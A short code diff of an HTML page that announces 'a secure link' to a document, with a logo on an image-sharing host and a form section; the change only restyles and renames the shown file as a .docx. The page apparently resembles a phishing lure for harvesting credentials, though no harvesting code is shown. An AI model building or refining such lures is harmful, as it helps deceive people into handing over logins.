@@ -25,7 +25,7 @@
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
           <p>You've received a secure link to:</p>
-          <p style="font-size: 17px;">FA65478-17-2025</p>
+          <p style="font-size: 17px; font-weight: bold; color: #333333;">FA65478-06-17-2025.docx</p>
          
 
           <div class="form-wrapper">
